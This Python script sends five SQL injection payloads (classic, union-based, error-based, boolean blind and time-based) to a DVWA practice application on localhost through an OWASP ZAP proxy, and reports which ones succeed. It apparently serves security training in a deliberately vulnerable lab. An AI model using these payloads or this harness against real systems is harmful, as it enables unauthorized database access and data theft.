import requests

# Adjust the URL to point to the correct DVWA path
url = 'http://localhost/vulnerabilities/sqli/?id=234&Submit=Submit'

# Replace with your actual session cookies from DVWA
cookies = {
    'PHPSESSID': "fuoq30i1imuhgkr4r3kjk6ggn6",  
    'security': 'low'  # Ensure the security level matches the one set in DVWA
}

# Configure proxy to use OWASP ZAP
proxies = {
    'http': 'http://localhost:8080',
    'https': 'http://localhost:8080'
}

# List of payloads to test different types of SQL Injection
payloads = {
    "Classic ' OR '1'='1": "' OR '1'='1",
    "Union-based": "' UNION SELECT null, database()-- ",
    "Error-based": "' AND 1=CONVERT(int, (SELECT @@version))-- ",
    "Boolean-based Blind": "' AND 1=1-- ",
    "Time-based Blind": "' AND SLEEP(5)-- "
}

for name, payload in payloads.items():
    data = {
        'id': payload,
        'Submit': 'Submit'
    }

    response = requests.post(url, cookies=cookies, data=data, proxies=proxies)

    if 'First name' in response.text or 'Surname' in response.text:
        print(f"{name} SQL Injection successful!")
        print(response.text)
    elif response.elapsed.total_seconds() > 5:
        print(f"{name} SQL Injection successful (time delay detected)!")
    else:
        print(f"{name} SQL Injection failed.")

    print("\n" + "-"*50 + "\n")
